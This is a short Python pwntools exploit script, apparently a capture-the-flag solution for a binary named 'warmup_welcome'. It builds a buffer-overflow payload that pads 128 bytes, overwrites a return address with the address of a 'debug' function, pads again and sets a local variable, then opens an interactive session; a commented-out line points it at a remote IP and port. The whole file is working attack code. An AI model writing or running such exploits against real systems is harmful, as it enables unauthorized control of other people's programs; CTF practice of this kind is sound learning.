from pwn import *

def exploit():
	binary = ELF("./warmup_welcome")
	#r = remote("180.250.7.183", 52557)
	r = process("./warmup_welcome")
	r.sendlineafter("Team : ", "NAYEON")
	debug = binary.symbols["debug"]
	first_pad = 128 #Gotten by doing dynamic analyzing on gdb and fuzzing so hard
	second_pad = 48 #Gotten by Fuzzing until we got the right padding for overwriting v7
	payload = "A" * first_pad
	payload += p32(debug) #address of debug
	payload += "A" * second_pad
	payload += "\x24\x23\x40" #condition of v7
	r.sendline(payload)
	r.interactive()

if __name__ == "__main__":
	exploit()
